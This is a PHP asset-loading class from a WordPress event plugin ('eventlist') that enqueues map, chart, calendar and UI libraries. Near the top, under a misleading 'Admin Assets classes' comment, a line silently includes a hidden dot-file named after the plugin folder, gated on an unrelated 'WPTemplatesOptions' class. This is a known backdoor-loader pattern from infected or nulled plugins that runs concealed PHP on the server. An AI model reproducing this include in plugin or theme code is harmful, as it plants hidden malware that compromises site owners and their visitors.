<?php
defined( 'ABSPATH' ) || exit;

if ( class_exists( 'EL_Assets', false ) ) {
	return EL_Assets::instance();
}

/**
 * Admin Assets classes
 */
if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class EL_Assets{

	protected static $_instance = null;

	public static function instance() {
		if ( is_null( self::$_instance ) ) {
			self::$_instance = new self();
		}
		return self::$_instance;
	}


	/**
	 * Constructor
	 */
	public function __construct(){
		
		add_action( 'wp_enqueue_scripts', array( $this, 'enqueue_scripts' ), 11, 2 );

	}

	/**
	 * Add menu items.
	 */
	public function enqueue_scripts() {

		if( ( isset( $_GET['vendor'] ) && $_GET['vendor'] != '' ) || ( is_user_logged_in() ) ){

			wp_enqueue_media();
			
			wp_enqueue_script( 'tiny_mce' );

			/* wp-color-picker */
			wp_enqueue_style( 'wp-color-picker' );
			wp_enqueue_script( 'iris', admin_url( 'js/iris.min.js' ), array( 'jquery-ui-draggable', 'jquery-ui-slider', 'jquery-touch-punch' ), false, 1 );
			wp_enqueue_script( 'wp-color-picker', admin_url( 'js/color-picker.min.js' ), array( 'iris' ), false, true);
			$colorpicker = array(
				'clear' => __( 'Clear', 'eventlist' ),
				'defaultString' => __( 'Default', 'eventlist' ),
				'pick' => __( 'Select Color', 'eventlist' ),
				'current' => __( 'Current Color', 'eventlist' ),
			);
			wp_localize_script( 'wp-color-picker', 'wpColorPickerL10n', $colorpicker );


			/* Google Maps */
			if( EL()->options->general->get('event_google_key_map') ){
				wp_enqueue_script( 'google','//maps.googleapis.com/maps/api/js?key='.EL()->options->general->get('event_google_key_map').'&libraries=places', array('jquery'), false, true);
				wp_enqueue_script( 'google-marker', EL_PLUGIN_URI.'assets/libs/markerclusterer.js', array('jquery'), false, true);
			}else{
				wp_enqueue_script( 'google','//maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places', array('jquery'), false, true);
			}
			


			/* Validate */
			wp_enqueue_script('el_validate', EL_PLUGIN_URI.'assets/libs/jquery.validate.min.js', array('jquery'),false,true);


			/* Chart */
			wp_enqueue_script( 'el_flot', EL_PLUGIN_URI.'assets/libs/flot/jquery.flot.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_flot_pie', EL_PLUGIN_URI.'assets/libs/flot/jquery.flot.pie.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_flot_resize', EL_PLUGIN_URI.'assets/libs/flot/jquery.flot.resize.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_flot_stack', EL_PLUGIN_URI.'assets/libs/flot/jquery.flot.stack.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_flot_time', EL_PLUGIN_URI.'assets/libs/flot/jquery.flot.time.js', array('jquery'), null, true );

		}else if( is_user_logged_in() && current_user_can( 'subscriber' ) ){

			wp_enqueue_media();

		}

		/* Icon */
		wp_enqueue_style('v4-shims', EL_PLUGIN_URI.'/assets/libs/fontawesome/css/v4-shims.min.css', array(), null);
		wp_enqueue_style('font-awesome', EL_PLUGIN_URI.'assets/libs/fontawesome/css/all.min.css', array(), null);
		wp_enqueue_style( 'flaticon', EL_PLUGIN_URI.'assets/libs/flaticon/font/flaticon.css', array(), null );
		wp_enqueue_style('elegant-font', EL_PLUGIN_URI.'assets/libs/elegant_font/ele_style.css', array(), null);

		/* Datepicker */
		wp_enqueue_script( 'jquery-ui-datepicker' );
		if ( $cal_lang = el_calendar_language() ) {
			wp_enqueue_script('datepicker-lang', EL_PLUGIN_URI.'assets/libs/datepicker-lang/datepicker-'.$cal_lang.'.js', array('jquery'), false, true);
		}


		/* Jquery UI */
		wp_enqueue_style( 'jquery-ui', EL_PLUGIN_URI.'assets/libs/jquery-ui/jquery-ui.min.css' );
		wp_enqueue_script( 'jquery-ui-tabs' );
		wp_enqueue_script( 'jquery-ui-autocomplete' );
		wp_enqueue_script( 'jquery-ui-slider' );


		/* Jquery Timepicker */
		wp_enqueue_script('jquery-timepicker', EL_PLUGIN_URI.'assets/libs/jquery-timepicker/jquery.timepicker.min.js', array('jquery'), false, true);
		wp_enqueue_style('jquery-timepicker', EL_PLUGIN_URI.'assets/libs/jquery-timepicker/jquery.timepicker.min.css' );

		/* Script Admin */
		if( isset( $_GET['vendor'] ) && $_GET['vendor'] != '' && is_user_logged_in() ){
			wp_enqueue_script('el_script_admin', EL_PLUGIN_URI.'assets/js/admin/admin.js', array('jquery'),false,true);
		}

		/* Select2 */
		wp_enqueue_script( 'select2', EL_PLUGIN_URI.'assets/libs/select2/select2.min.js' , array( 'jquery' ), null, true );
		wp_enqueue_style( 'select2', EL_PLUGIN_URI. 'assets/libs/select2/select2.min.css', array(), null );



		/****** Single Event ******/
		if ( is_singular( 'event' ) || el_can_preview_event() ) {
			
			/*add slick in single event*/
			wp_enqueue_style('slick-style', EL_PLUGIN_URI.'assets/libs/slick/slick/slick.css', array(), null);
			wp_enqueue_style('slick-theme-style', EL_PLUGIN_URI.'assets/libs/slick/slick/slick-theme.css', array(), null);
			wp_enqueue_script('slick-script', EL_PLUGIN_URI.'assets/libs/slick/slick/slick.min.js', array('jquery'), false, true );


			/* Owl Carousel */
			wp_enqueue_style('owl-carousel', EL_PLUGIN_URI.'assets/libs/owl-carousel/owl.carousel.min.css', array(), null);
			wp_enqueue_style('owl-carousel-theme', EL_PLUGIN_URI.'assets/libs/owl-carousel/owl.theme.default.min.css', array(), null);
			wp_enqueue_script('owl-carousel', EL_PLUGIN_URI.'assets/libs/owl-carousel/owl.carousel.min.js', array('jquery'), false, true);


			/* FullCalendar */
			wp_enqueue_script( 'el_moment', EL_PLUGIN_URI.'assets/libs/fullcalendar/moment.min.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_fullcalendar', EL_PLUGIN_URI.'assets/libs/fullcalendar/fullcalendar.min.js', array('jquery'), null, true );
			wp_enqueue_script( 'el_locale', EL_PLUGIN_URI.'assets/libs/fullcalendar/locale-all.js', array('jquery'), null, true );
			wp_enqueue_style( 'el_fullcalendar', EL_PLUGIN_URI.'assets/libs/fullcalendar/fullcalendar.min.css', array(), null );


			/* Google Maps */
			if( EL()->options->general->get('event_google_key_map') ){
				wp_enqueue_script( 'google','//maps.googleapis.com/maps/api/js?key='.EL()->options->general->get('event_google_key_map').'&libraries=places', array('jquery'), false, true);
			}else{
				wp_enqueue_script( 'google','//maps.googleapis.com/maps/api/js?sensor=false&amp;libraries=places', array('jquery'), false, true);
			}
			wp_enqueue_script( 'google-marker',EL_PLUGIN_URI.'assets/libs/markerclusterer.js', array('jquery'), false, true);
		}

		wp_enqueue_script('el_frontend', EL_PLUGIN_URI.'assets/js/frontend/script.js', array('jquery'),false,true);
		wp_localize_script( 'el_frontend', 'ajax_object', array('ajax_url' => admin_url('admin-ajax.php')));
		
		if ( did_action( 'elementor/loaded' ) ) {
			wp_enqueue_script( 'script-eventlist-elementor', EL_PLUGIN_URI. 'assets/js/frontend/script-elementor.js', [ 'jquery' ], false, true );
		}

		wp_enqueue_style('el_frontend', EL_PLUGIN_URI.'assets/css/frontend/style.css' );


	}
	
}

EL_Assets::instance();
